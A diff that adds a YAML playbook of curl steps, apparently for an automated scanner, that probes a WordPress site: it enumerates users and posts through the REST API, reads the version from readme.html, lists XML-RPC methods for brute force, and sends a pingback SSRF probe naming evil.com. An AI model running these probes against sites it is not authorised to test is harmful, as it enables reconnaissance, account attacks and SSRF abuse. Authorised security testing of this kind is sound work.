@@ -1,0 +1,26 @@
+steps:
+  - tool: curl
+    arguments:
+      url: "http://{target}/wp-json/wp/v2/users"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'CMS: WordPress REST API user enumeration'
+  - tool: curl
+    arguments:
+      url: "http://{target}/wp-json/wp/v2/posts"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'CMS: WordPress REST API post enumeration for content discovery'
+  - tool: curl
+    arguments:
+      url: "http://{target}/readme.html"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'CMS: WordPress readme.html for exact version disclosure'
+  - tool: curl
+    arguments:
+      url: "http://{target}/xmlrpc.php"
+      additional_args: '-s -L -X POST -d "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'CMS: WordPress XML-RPC method enumeration for brute force or pingback SSRF'
+  - tool: curl
+    arguments:
+      url: "http://{target}/xmlrpc.php"
+      additional_args: '-s -L -X POST -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://evil.com</string></value></param><param><value><string>http://{target}/</string></value></param></params></methodCall>" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'CMS: WordPress XML-RPC pingback SSRF test'
